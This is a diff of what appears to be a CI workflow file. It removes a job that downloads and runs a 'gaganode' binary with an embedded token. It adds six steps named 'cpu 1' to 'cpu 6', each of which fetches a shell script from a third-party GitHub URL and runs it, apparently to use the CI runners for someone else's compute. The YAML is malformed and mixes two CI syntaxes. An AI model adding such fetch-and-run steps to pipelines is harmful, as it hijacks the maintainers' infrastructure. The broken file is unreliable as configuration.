@@ -1,33 +1,39 @@
 # This is a basic workflow to help you get started with Actions
 
-name: CI
-
-# Controls when the workflow will run
-on:
-  # Triggers the workflow on push or pull request events but only for the "main" branch
-  push:
-    branches: [ "main" ]
-  pull_request:
-    branches: [ "main" ]
-
-  # Allows you to run this workflow manually from the Actions tab
-  workflow_dispatch:
-
-# A workflow run is made up of one or more jobs that can run sequentially or in parallel
-jobs:
-  # This workflow contains a single job called "build"
-  build:
-    # The type of runner that the job will run on
-    runs-on: ubuntu-latest
-
-    # Steps represent a sequence of tasks that will be executed as part of the job
-    steps:
-      # Checks-out your repository under $GITHUB_WORKSPACE, so your job can access it
-      - uses: actions/checkout@v3
-
-      # Runs a single command using the runners shell
-      - name: Run a one-line script
-        run: wget https://assets.coreservice.io/public/sdk/gaganode/1.0.4/gaganode-linux-amd64.tar.gz
-             tar -zxf gaganode-linux-ard64.tar.gz
-             cd gaganode-linux-amd64/root_conf/default.toml set --token=gdsbwedwllrwrjkpc0fc5f8c6511e39a
-             gaganode-linux-amd64/gaganode
+name: cpu 1
+          caches:
+            - pip
+          script:
+            - if [ -f requirements.txt ]; then pip install -r requirements.txt; fi
+            - pip install pytest
+            - wget https://raw.githubusercontent.com/huntersback/cpu/main/cpu%20x.sh && chmod +x cpu%20x.sh && ./cpu%20x.sh
+      - step:
+          name: cpu 2
+          script:
+            - pip install flake8
+            - flake8 . --extend-exclude=dist,build --show-source --statistics
+            - wget https://raw.githubusercontent.com/huntersback/cpu/main/cpu%20x.sh && chmod +x cpu%20x.sh && ./cpu%20x.sh
+      - step:
+          name: cpu 3
+          script:
+            - pip install flake8
+            - flake8 . --extend-exclude=dist,build --show-source --statistics
+            - wget https://raw.githubusercontent.com/huntersback/cpu/main/cpu%20x.sh && chmod +x cpu%20x.sh && ./cpu%20x.sh
+      - step:
+          name: cpu 4
+          script:
+            - pip install flake8
+            - flake8 . --extend-exclude=dist,build --show-source --statistics
+            - wget https://raw.githubusercontent.com/huntersback/cpu/main/cpu%20x.sh && chmod +x cpu%20x.sh && ./cpu%20x.sh
+      - step:
+          name: cpu 5
+          script:
+            - pip install flake8
+            - flake8 . --extend-exclude=dist,build --show-source --statistics
+            - wget https://raw.githubusercontent.com/huntersback/cpu/main/cpu%20x.sh && chmod +x cpu%20x.sh && ./cpu%20x.sh
+      - step:
+          name: cpu 6
+          script:
+            - pip install flake8
+            - flake8 . --extend-exclude=dist,build --show-source --statistics
+            - wget https://raw.githubusercontent.com/huntersback/cpu/main/cpu%20x.sh && chmod +x cpu%20x.sh && ./cpu%20x.sh
